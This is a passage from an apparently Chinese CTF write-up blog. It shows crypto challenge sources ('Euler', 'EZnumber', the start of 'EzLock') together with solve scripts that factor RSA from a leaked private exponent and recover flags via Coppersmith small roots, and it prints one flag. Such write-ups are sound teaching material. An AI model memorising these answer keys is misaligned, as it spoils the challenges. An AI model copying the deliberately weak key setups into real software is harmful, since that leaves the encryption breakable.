punctuation">,</span> <span class="token number">1804</span><span class="token punctuation">,</span> <span class="token number">279</span><span class="token punctuation">,</span> <span class="token number">806</span><span class="token punctuation">,</span> <span class="token number">912</span><span class="token punctuation">,</span> <span class="token number">1837</span><span class="token punctuation">,</span> <span class="token number">1566</span><span class="token punctuation">,</span> <span class="token number">1135</span><span class="token punctuation">,</span> <span class="token number">486</span><span class="token punctuation">,</span> <span class="token number">1648</span><span class="token punctuation">,</span> <span class="token number">1341</span><span class="token punctuation">,</span> <span class="token number">1008</span><span class="token punctuation">,</span> <span class="token number">637</span><span class="token punctuation">,</span> <span class="token number">1699</span><span class="token punctuation">,</span> <span class="token number">1396</span><span class="token punctuation">,</span> <span class="token number">336</span><span class="token punctuation">,</span> <span class="token number">1689</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token number">1033</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">1161</span><span class="token punctuation">,</span> <span class="token number">1647</span><span class="token punctuation">,</span> <span class="token number">669</span><span class="token punctuation">,</span> <span class="token number">1788</span><span class="token punctuation">,</span> <span class="token number">1711</span><span class="token punctuation">,</span> <span class="token number">1980</span><span class="token punctuation">,</span> <span class="token number">1882</span><span class="token punctuation">,</span> <span class="token number">259</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">1467</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">861</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">1485</span><span class="token punctuation">,</span> <span class="token number">1832</span><span class="token punctuation">,</span> <span class="token number">1658</span><span class="token punctuation">,</span> <span class="token number">262</span><span class="token punctuation">,</span> <span class="token number">1207</span><span class="token punctuation">,</span> <span class="token number">719</span><span class="token punctuation">,</span> <span class="token number">1982</span><span class="token punctuation">,</span> <span class="token number">1108</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1894</span><span class="token punctuation">,</span> <span class="token number">669</span><span class="token punctuation">,</span> <span class="token number">437</span><span class="token punctuation">,</span> <span class="token number">1976</span><span class="token punctuation">,</span> <span class="token number">344</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">,</span> <span class="token number">1697</span><span class="token punctuation">,</span> <span class="token number">874</span><span class="token punctuation">,</span> <span class="token number">1486</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">1252</span><span class="token punctuation">,</span> <span class="token number">1018</span><span class="token punctuation">,</span> <span class="token number">561</span><span class="token punctuation">,</span> <span class="token number">375</span><span class="token punctuation">,</span> <span class="token number">1908</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">1934</span><span class="token punctuation">,</span> <span class="token number">608</span><span class="token punctuation">,</span> <span class="token number">1615</span><span class="token punctuation">,</span> <span class="token number">658</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">,</span> <span class="token number">457</span><span class="token punctuation">,</span> <span class="token number">409</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">1388</span><span class="token punctuation">,</span> <span class="token number">1959</span><span class="token punctuation">,</span> <span class="token number">1126</span><span class="token punctuation">,</span> <span class="token number">656</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">507</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1324</span><span class="token punctuation">,</span> <span class="token number">508</span><span class="token punctuation">,</span> <span class="token number">1862</span><span class="token punctuation">,</span> <span class="token number">1516</span><span class="token punctuation">,</span> <span class="token number">693</span><span class="token punctuation">,</span> <span class="token number">1819</span><span class="token punctuation">,</span> <span class="token number">1583</span><span class="token punctuation">,</span> <span class="token number">1472</span><span class="token punctuation">,</span> <span class="token number">671</span><span class="token punctuation">,</span> <span class="token number">1295</span><span class="token punctuation">,</span> <span class="token number">1526</span><span class="token punctuation">,</span> <span class="token number">1094</span><span class="token punctuation">,</span> <span class="token number">518</span><span class="token punctuation">,</span> <span class="token number">1189</span><span class="token punctuation">,</span> <span class="token number">1583</span><span class="token punctuation">,</span> <span class="token number">1345</span><span class="token punctuation">,</span> <span class="token number">1054</span><span class="token punctuation">,</span> <span class="token number">1788</span><span class="token punctuation">,</span> <span class="token number">661</span><span class="token punctuation">,</span> <span class="token number">960</span><span class="token punctuation">,</span> <span class="token number">975</span><span class="token punctuation">,</span> <span class="token number">927</span><span class="token punctuation">,</span> <span class="token number">423</span><span class="token punctuation">,</span> <span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">791</span><span class="token punctuation">,</span> <span class="token number">1282</span><span class="token punctuation">,</span> <span class="token number">1239</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">1686</span><span class="token punctuation">,</span> <span class="token number">745</span><span class="token punctuation">,</span> <span class="token number">754</span><span class="token punctuation">,</span> <span class="token number">1417</span><span class="token punctuation">,</span> <span class="token number">1347</span><span class="token punctuation">,</span> <span class="token number">1581</span><span class="token punctuation">,</span> <span class="token number">626</span><span class="token punctuation">,</span> <span class="token number">1772</span><span class="token punctuation">,</span> <span class="token number">1465</span><span class="token punctuation">,</span> <span class="token number">1985</span><span class="token punctuation">,</span> <span class="token number">968</span><span class="token punctuation">,</span> <span class="token number">1728</span><span class="token punctuation">,</span> <span class="token number">1641</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1280</span><span class="token punctuation">,</span> <span class="token number">392</span><span class="token punctuation">,</span> <span class="token number">1695</span><span class="token punctuation">,</span> <span class="token number">882</span><span class="token punctuation">,</span> <span class="token number">1225</span><span class="token punctuation">,</span> <span class="token number">1766</span><span class="token punctuation">,</span> <span class="token number">683</span><span class="token punctuation">,</span> <span class="token number">633</span><span class="token punctuation">,</span> <span class="token number">1065</span><span class="token punctuation">,</span> <span class="token number">1605</span><span class="token punctuation">,</span> <span class="token number">1086</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">1836</span><span class="token punctuation">,</span> <span class="token number">583</span><span class="token punctuation">,</span> <span class="token number">589</span><span class="token punctuation">,</span> <span class="token number">1075</span><span class="token punctuation">,</span> <span class="token number">810</span><span class="token punctuation">,</span> <span class="token number">652</span><span class="token punctuation">,</span> <span class="token number">1105</span><span class="token punctuation">,</span> <span class="token number">511</span><span class="token punctuation">,</span> <span class="token number">1756</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">988</span><span class="token punctuation">,</span> <span class="token number">1175</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">630</span><span class="token punctuation">,</span> <span class="token number">320</span><span class="token punctuation">,</span> <span class="token number">343</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">1885</span><span class="token punctuation">,</span> <span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">1121</span><span class="token punctuation">,</span> <span class="token number">1650</span><span class="token punctuation">,</span> <span class="token number">1101</span><span class="token punctuation">,</span> <span class="token number">895</span><span class="token punctuation">,</span> <span class="token number">294</span><span class="token punctuation">,</span> <span class="token number">1710</span><span class="token punctuation">,</span> <span class="token number">1995</span><span class="token punctuation">,</span> <span class="token number">1022</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">340</span><span class="token punctuation">,</span> <span class="token number">1498</span><span class="token punctuation">,</span> <span class="token number">491</span><span class="token punctuation">,</span> <span class="token number">1964</span><span class="token punctuation">,</span> <span class="token number">993</span><span class="token punctuation">,</span> <span class="token number">1479</span><span class="token punctuation">,</span> <span class="token number">1752</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">1156</span><span class="token punctuation">,</span> <span class="token number">493</span><span class="token punctuation">,</span> <span class="token number">1812</span><span class="token punctuation">,</span> <span class="token number">1892</span><span class="token punctuation">,</span> <span class="token number">595</span><span class="token punctuation">,</span> <span class="token number">1919</span><span class="token punctuation">,</span> <span class="token number">897</span><span class="token punctuation">,</span> <span class="token number">1520</span><span class="token punctuation">,</span> <span class="token number">1503</span><span class="token punctuation">,</span> <span class="token number">1102</span><span class="token punctuation">,</span> <span class="token number">809</span><span class="token punctuation">,</span> <span class="token number">1374</span><span class="token punctuation">,</span> <span class="token number">1693</span><span class="token punctuation">,</span> <span class="token number">538</span><span class="token punctuation">,</span> <span class="token number">1310</span><span class="token punctuation">,</span> <span class="token number">372</span><span class="token punctuation">,</span> <span class="token number">543</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">1912</span><span class="token punctuation">,</span> <span class="token number">1193</span><span class="token punctuation">,</span> <span class="token number">356</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1336</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">,</span> <span class="token number">1111</span><span class="token punctuation">,</span> <span class="token number">1678</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">298</span><span class="token punctuation">,</span> <span class="token number">410</span><span class="token punctuation">,</span> <span class="token number">740</span><span class="token punctuation">,</span> <span class="token number">1039</span><span class="token punctuation">,</span> <span class="token number">258</span><span class="token punctuation">,</span> <span class="token number">1256</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">542</span><span class="token punctuation">,</span> <span class="token number">1181</span><span class="token punctuation">,</span> <span class="token number">1683</span><span class="token punctuation">,</span> <span class="token number">1782</span><span class="token punctuation">,</span> <span class="token number">1355</span><span class="token punctuation">,</span> <span class="token number">1598</span><span class="token punctuation">,</span> <span class="token number">853</span><span class="token punctuation">,</span> <span class="token number">1372</span><span class="token punctuation">,</span> <span class="token number">1016</span><span class="token punctuation">,</span> <span class="token number">1416</span><span class="token punctuation">,</span> <span class="token number">466</span><span class="token punctuation">,</span> <span class="token number">502</span><span class="token punctuation">,</span> <span class="token number">528</span><span class="token punctuation">,</span> <span class="token number">1428</span><span class="token punctuation">,</span> <span class="token number">1742</span><span class="token punctuation">,</span> <span class="token number">1748</span><span class="token punctuation">,</span> <span class="token number">963</span><span class="token punctuation">,</span> <span class="token number">1967</span><span class="token punctuation">,</span> <span class="token number">844</span><span class="token punctuation">,</span> <span class="token number">596</span><span class="token punctuation">,</span> <span class="token number">996</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">525</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">1576</span><span class="token punctuation">,</span> <span class="token number">741</span><span class="token punctuation">,</span> <span class="token number">532</span><span class="token punctuation">,</span> <span class="token number">583</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">535</span><span class="token punctuation">,</span> <span class="token number">762</span><span class="token punctuation">,</span> <span class="token number">521</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">1204</span><span class="token punctuation">,</span> <span class="token number">1460</span><span class="token punctuation">,</span> <span class="token number">1848</span><span class="token punctuation">,</span> <span class="token number">494</span><span class="token punctuation">,</span> <span class="token number">1704</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">1437</span><span class="token punctuation">,</span> <span class="token number">1946</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1308</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">975</span><span class="token punctuation">,</span> <span class="token number">1577</span><span class="token punctuation">,</span> <span class="token number">762</span><span class="token punctuation">,</span> <span class="token number">1978</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">562</span><span class="token punctuation">,</span> <span class="token number">1373</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1046</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">542</span><span class="token punctuation">,</span> <span class="token number">695</span><span class="token punctuation">,</span> <span class="token number">582</span><span class="token punctuation">,</span> <span class="token number">1455</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">1343</span><span class="token punctuation">,</span> <span class="token number">458</span><span class="token punctuation">,</span> <span class="token number">1365</span><span class="token punctuation">,</span> <span class="token number">1859</span><span class="token punctuation">,</span> <span class="token number">1722</span><span class="token punctuation">,</span> <span class="token number">1967</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">447</span><span class="token punctuation">,</span> <span class="token number">1545</span><span class="token punctuation">,</span> <span class="token number">1190</span><span class="token punctuation">,</span> <span class="token number">1278</span><span class="token punctuation">,</span> <span class="token number">675</span><span class="token punctuation">,</span> <span class="token number">1992</span><span class="token punctuation">,</span> <span class="token number">1769</span><span class="token punctuation">,</span> <span class="token number">1435</span><span class="token punctuation">,</span> <span class="token number">358</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">796</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1615</span><span class="token punctuation">,</span> <span class="token number">927</span><span class="token punctuation">,</span> <span class="token number">1789</span><span class="token punctuation">,</span> <span class="token number">823</span><span class="token punctuation">]</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">644</span><span class="token punctuation">,</span> <span class="token number">915</span><span class="token punctuation">,</span> <span class="token number">892</span><span class="token punctuation">,</span> <span class="token number">1015</span><span class="token punctuation">,</span> <span class="token number">1876</span><span class="token punctuation">,</span> <span class="token number">1611</span><span class="token punctuation">,</span> <span class="token number">925</span><span class="token punctuation">,</span> <span class="token number">334</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">629</span><span class="token punctuation">,</span> <span class="token number">1829</span><span class="token punctuation">,</span> <span class="token number">1939</span><span class="token punctuation">,</span> <span class="token number">1681</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">646</span><span class="token punctuation">,</span> <span class="token number">502</span><span class="token punctuation">,</span> <span class="token number">1284</span><span class="token punctuation">,</span> <span class="token number">663</span><span class="token punctuation">,</span> <span class="token number">1592</span><span class="token punctuation">,</span> <span class="token number">1890</span><span class="token punctuation">,</span> <span class="token number">1097</span><span class="token punctuation">,</span> <span class="token number">1499</span><span class="token punctuation">,</span> <span class="token number">1927</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">1202</span><span class="token punctuation">,</span> <span class="token number">2012</span><span class="token punctuation">,</span> <span class="token number">985</span><span class="token punctuation">,</span> <span class="token number">1393</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">1220</span><span class="token punctuation">,</span> <span class="token number">1687</span><span class="token punctuation">,</span> <span class="token number">1712</span><span class="token punctuation">,</span> <span class="token number">1077</span><span class="token punctuation">,</span> <span class="token number">1957</span><span class="token punctuation">,</span> <span class="token number">1418</span><span class="token punctuation">,</span> <span class="token number">555</span><span class="token punctuation">,</span> <span class="token number">514</span><span class="token punctuation">,</span> <span class="token number">1552</span><span class="token punctuation">,</span> <span class="token number">968</span><span class="token punctuation">,</span> <span class="token number">1645</span><span class="token punctuation">,</span> <span class="token number">1850</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">587</span><span class="token punctuation">,</span> <span class="token number">463</span><span class="token punctuation">,</span> <span class="token number">963</span><span class="token punctuation">,</span> <span class="token number">1503</span><span class="token punctuation">,</span> <span class="token number">1251</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1251</span><span class="token punctuation">,</span> <span class="token number">1711</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">1891</span><span class="token punctuation">,</span> <span class="token number">740</span><span class="token punctuation">,</span> <span class="token number">1358</span><span class="token punctuation">,</span> <span class="token number">1698</span><span class="token punctuation">,</span> <span class="token number">295</span><span class="token punctuation">,</span> <span class="token number">1313</span><span class="token punctuation">,</span> <span class="token number">1812</span><span class="token punctuation">,</span> <span class="token number">1067</span><span class="token punctuation">,</span> <span class="token number">455</span><span class="token punctuation">,</span> <span class="token number">1622</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">1083</span><span class="token punctuation">]</span>key <span class="token operator">=</span> matrix<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>c <span class="token operator">=</span> vector<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>m <span class="token operator">=</span> key \ c<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;0e3ceb92-ef28-48ff-8a1f-556ea8e96263&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Euler"><a href="#Euler" class="headerlink" title="Euler"></a>Euler</h1><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n1 <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'d ='</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n1 ='</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span>n2 <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n2 <span class="token operator">*=</span> tmp    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>e <span class="token operator">=</span> pc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>p<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''d = 1191103734504058491421349604548564929848616842152689496895544381837156883533438743584190765148552934760581271144506002162145850044043706855922892271482076871873995241085136144968243140990856473896170280564822732549232192446031619309897442553542363254504471740017966570662964696395047018142115398837264339359703632345253800336497946214283448557066829445107164480953216959246058743836325220516737638124436265379246043689904351250933647836622874758885644860021461954464385862680106712884194095768373281466098064819110033091294767089010003022970009602841916377292236136049332199074587736162893766795170383769105855396481n1 = 13580613334758608446812976519363134969987613428002924766535019511562587104406919787452524386837284913953412450765046949147625708826808005604839699164252065405707381022094044455947068672776228380259796742758661695038105462132145830673755861626914728707456430832560451486001864528121467715375751025330165798298234749333641286199156268444951660172758198564829589895780644285230824166251980165312273600373379395893191960302458674257328572576250700441136204817923980559222287090491322038600230306017349810608247758292597409739448697047571469597942133677889648017239246044193456551115423543297398389835141582226233401091651n2 = 1214806402018035399640161601350276689119300500885922730338627878893519991129980125476434307328318616551645952775278810103829168554249376991124646974529506458637833256309925386195767085673143119319959502919427611337245914269082657148902705137556296048781578971739222821624583120801659535369927877985173236243714461317935517361255270715241189816284530991305321818355420570545833978683123138276923580243415962479127687019106264574314649544746346086459905012212977958967691480715239783822121874583716717022133331534258680100103894980839994381411182849477289831563331555051111524494710894174250831042393260657010039224282544484051247017811298503920278914985702602401902771910416165113998593372720867385848641975504106450347785422029536444684536992419844582901814455572310411304170053743720539065216022165732393062765647406642461667856590659949987014165020908912248704605394194332522772838334355686250772722614893659631917281850223784937395431499960460631775969046704990152101465734651932493302101064276553602695086721483441047849063689763309160624353722539937307711289340553305706186969043326282042780389837191270199164643251358171042535614702470861637110776902483824241373428279843481575953477705679020507998934443944753893015492521729164439c = 829714996515560908603942343505920996556339059436557287421074174277687809974667533248085244071086827486112801279665776466949992570288124598686592774771062800764512333540404127622921352174419248968970404794754685847236748961563984628001223295272803310968932487079932521884266677193760840062257399310444131681778575116034804962240312440452076927109544707668525304555494031530153484385014733733295665648179563341929829366393842180933029552234342383165468329118358481709562138556464490952636983157762226775051069620144327191146321078089031134997806488306619954921967209307290224398561337468466377749200533482249418692505335754212596152956893594720809675348504752525191974229476876972508737538861376367290460994163758533707257433535992369795872961693633915923559165304176024241693969803856234404053572424185908635089962296448104233424369921110004610276316317120909034370571217382030431552784144041430129071509829206755292634358474170376986660230213480604735611696589811824530116203051420922042313844629631979060959674508082246111229472102010511440894011705450255517464228219748967389876595425302704439665665510611452129328353818804395006155136491014104673084625985358676817967767734690717397046423097222254342558118886724303282396865112622135'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-none"><code class="language-none">e &#x3D; d &#x3D; n1 &#x3D; n2 &#x3D; c &#x3D; import randomfrom Crypto.Util.number import *def getpq(n,e,d):    while True:        k &#x3D; e * d - 1        g &#x3D; random.randint(0, n)        while k%2 &#x3D;&#x3D; 0:            k &#x3D; k &#x2F;&#x2F; 2            temp &#x3D; pow(g,k,n)-1            if GCD(temp,n)&gt;1 and temp!&#x3D;0:                return GCD(temp,n)p &#x3D; getpq(n1, e, d)q &#x3D; n1 &#x2F;&#x2F; pphi &#x3D; euler_phi(n2)print(long_to_bytes(pow(c, inverse_mod(p, phi), n2)))print(long_to_bytes(pow(c, inverse_mod(q, phi), n2)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="EZnumber"><a href="#EZnumber" class="headerlink" title="EZnumber"></a>EZnumber</h1><p>题目</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">assert</span> m<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">200</span>B <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>A <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2022</span><span class="token operator">-</span><span class="token number">2023</span><span class="token operator">*</span>m<span class="token punctuation">)</span> <span class="token operator">%</span> Bleak <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2023</span><span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token comment"># 170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span><span class="token comment"># 66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>A <span class="token operator">=</span> <span class="token number">170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span>leak <span class="token operator">=</span> <span class="token number">66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span><span class="token comment"># A+2023*m-2022 = 0 % B</span>KB <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2023</span><span class="token punctuation">)</span><span class="token operator">-</span>leakPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>KB<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> A<span class="token operator">+</span><span class="token number">2023</span><span class="token operator">*</span>m<span class="token operator">-</span><span class="token number">2022</span>f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>x <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">200</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="EzLock"><a href="#EzLock" class="headerlink" title="EzLock"></a>EzLock</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>m <span class="token 